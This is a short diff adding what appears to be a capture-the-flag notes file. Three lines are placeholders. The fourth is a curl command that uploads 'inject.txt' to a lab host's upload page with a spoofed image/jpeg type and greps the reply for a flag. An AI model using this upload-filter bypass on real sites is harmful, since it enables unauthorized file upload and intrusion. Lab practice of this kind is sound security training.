@@ -1,0 +1,4 @@
+1) blablabla
+2)
+3)
+4) curl --form "Upload=send" --header "Content-Type: multipart/form-data" --form "uploaded=@inject.txt;type=image/jpeg" 172.16.129.138/?page=upload | grep flag
